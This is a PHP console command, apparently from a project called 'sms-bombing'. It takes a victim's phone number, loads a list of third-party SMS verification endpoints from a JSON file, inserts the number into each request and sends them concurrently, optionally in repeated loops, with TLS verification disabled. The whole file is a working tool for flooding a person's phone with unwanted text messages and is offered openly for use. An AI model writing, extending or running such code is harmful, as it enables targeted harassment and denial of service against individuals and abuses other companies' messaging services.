<?php

/*
 * This file is part of james.xue/sms-bombing.
 *
 * (c) xiaoxuan6 <15227736751@qq.com>
 *
 * This source file is subject to the MIT license that is bundled
 * with this source code in the file LICENSE.
 *
 */

namespace Vinhson\SmsBombing\Commands;

use GuzzleHttp\{Client, Pool};
use Illuminate\Support\Collection;
use GuzzleHttp\Psr7\{Request, Response};
use GuzzleHttp\Exception\RequestException;
use Symfony\Component\Console\Output\OutputInterface;
use Symfony\Component\Console\SingleCommandApplication;
use Symfony\Component\Console\Input\{InputArgument, InputInterface, InputOption};

class SMSBombingCommand extends SingleCommandApplication
{
    protected function configure()
    {
        $this->setName('sms-bombing')
            ->setDescription('短信轰炸')
            ->addArgument('phone', InputArgument::REQUIRED, '轰炸手机号')
            ->addOption('num', 'num', InputOption::VALUE_OPTIONAL, '轰炸次数', 10)
            ->addOption('loop', 'l', InputOption::VALUE_OPTIONAL, '启动循环轰炸次数,', 0);
    }

    /**
     * @param InputInterface $input
     * @param OutputInterface $output
     * @return int
     */
    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $i = 0;
        $status = true;
        $apis = $this->fetchApi();
        $loop = $input->getOption('loop');
        $phone = $input->getArgument('phone');

        do {
            $apis = $input->getOption('num') == 'all' ? $apis->toArray() : $apis->random($input->getOption('num'));
            $requests = function () use ($apis, $phone) {
                foreach ($apis as $api) {
                    $url = str_replace('[phone]', $phone, $api['url']);
                    $body = is_array($api['data']) ? array_map(fn ($item): string|array => str_replace('[phone]', $phone, $item), $api['data']) : [];

                    yield new Request($api['method'], $url, is_array($api['header']) ? $api['header'] : [], json_encode($body, JSON_UNESCAPED_UNICODE));
                }
            };

            $pool = new Pool(new Client(['verify' => false]), $requests(), [
                'concurrency' => 5,
                'fulfilled' => function (Response $response, $index) use ($output): void {
                    $output->writeln("<info>索引：{$index}</info>" . " 请求结果：<comment>{$response->getBody()}</comment>");
                },
                'rejected' => function (RequestException $reason, $index) use ($output): void {
                    $output->writeln("<info>索引：{$index}</info>" . " 请求结果：<error>{$reason->getMessage()}</error>");
                },
            ]);

            $promise = $pool->promise();
            $promise->wait();

            if ($loop > 0 && $i < $loop) {
                $i++;
            } else {
                $status = false;
            }

        } while ($status);

        return self::SUCCESS;
    }

    /**
     * @return Collection
     */
    protected function fetchApi(): Collection
    {
        return collect(json_decode(file_get_contents(__DIR__ . '/../../api.json'), true));
    }
}
